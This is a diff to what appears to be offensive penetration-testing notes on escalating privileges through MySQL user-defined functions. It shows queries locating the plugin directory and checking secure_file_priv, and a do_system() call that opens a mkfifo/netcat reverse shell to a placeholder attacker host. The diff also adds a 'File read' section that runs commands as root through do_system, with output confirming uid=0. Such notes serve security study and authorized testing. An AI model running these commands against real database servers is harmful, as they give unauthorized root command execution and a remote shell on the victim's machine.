@@ -810,6 +810,7 @@ Transfer & Prepare:
 mysql > use mysql;
 mysql > SHOW VARIABLES LIKE 'datadir';             <- Locate where the plugin files are (we need it to create exploitation function)
 mysql > SHOW VARIABLES LIKE '%plugin%';            <- Plugin location
+mysql> SHOW VARIABLES LIKE 'secure_file_priv';     <- Determine whether the database has been misconfigured to allow insecure handling of files
 Server version: 5.7.30 MySQL Community Server (GPL)
 
 mysql > CREATE TABLE potato(line blob);
@@ -824,6 +825,25 @@ mysql > SELECT * FROM mysql.func;                  <- sanity check
 +-----------+-----+----------------+----------+
 mysql > select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f');
 ```
+
+**File read:**
+
+```
+mysql> select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
+select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
++----------------------------------------------------------------------+
+| do_system('id > /var/www/out; chown www-data.www-data /var/www/out') |
++----------------------------------------------------------------------+
+|                                                                    0 |
++----------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> \! sh          
+\! sh
+$ cat /var/www/out
+cat /var/www/out
+uid=0(root) gid=114(mysql) groups=114(mysql)
+``` 
 
 ##
 
